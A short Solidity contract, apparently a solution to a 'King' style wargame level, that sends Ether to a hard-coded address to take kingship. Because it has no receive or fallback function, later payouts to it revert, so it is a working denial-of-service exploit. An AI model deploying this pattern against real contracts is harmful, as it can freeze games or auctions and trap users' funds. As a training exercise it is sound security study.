// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.0 < 0.9.0;

contract HackKing {

    address payable king = payable(0xD5443621c00DE46Cc087a8F58122aDab3ed29eDF); 

    function claimKingship() public payable {
        (bool success,)= king.call{value: msg.value}("");
        require(success);
    }
}